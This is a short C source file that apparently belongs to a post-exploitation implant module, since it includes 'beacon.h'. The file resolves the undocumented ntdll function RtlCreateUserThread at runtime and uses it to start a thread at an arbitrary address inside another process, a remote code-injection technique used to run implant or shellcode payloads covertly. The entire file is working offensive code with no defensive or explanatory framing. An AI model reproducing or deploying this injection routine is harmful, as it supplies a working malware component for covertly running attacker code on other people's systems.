#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <Tlhelp32.h>
#include "beacon.h"
#include "inject.h"

typedef struct {
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID;

typedef long(*_RtlCreateUserThread)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, CLIENT_ID *);

BOOL inject_via_createuserthread(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter) {
	HANDLE hRemoteThread = NULL;
	LPVOID funcAddr = NULL;
	CLIENT_ID cid;

	funcAddr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateUserThread");

	if (funcAddr) {
		_RtlCreateUserThread func = (_RtlCreateUserThread)funcAddr;
		func(hProcess, NULL, FALSE, 0, 0, 0, (PVOID)lpStartAddress, (PVOID)lpParameter, &hRemoteThread, &cid);
		return hRemoteThread != NULL;
	}

	return FALSE;
}
